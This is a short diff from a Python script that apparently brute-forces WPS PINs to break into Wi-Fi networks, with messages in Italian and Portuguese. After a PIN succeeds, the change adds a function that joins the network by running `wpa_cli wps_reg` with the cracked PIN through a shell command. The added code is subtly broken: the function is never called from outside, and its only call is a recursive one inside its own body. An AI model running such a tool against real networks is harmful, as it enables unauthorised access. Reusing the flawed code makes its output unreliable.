@@ -103,7 +103,14 @@ while True:
                 if "SUCCESS" in result:
                     print(verde)
                     print(f"Successo! PIN: {pin}")
-                    exit()
+                    def connect_to_wifi_with_wps_pin(pin):
+                        command = f"wpa_cli -i wlan0 wps_reg {pin}"
+                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
+                        if output.returncode == 0:
+                            print(verde+"Conexão estabelecida com sucesso usando o PIN WPS!")
+                        else:
+                            print(vermelho+"Falha ao estabelecer a conexão usando o PIN WPS.")
+                        connect_to_wifi_with_wps_pin(pin)
                 else:
                     print(amarelo+"PIN inválido")
 
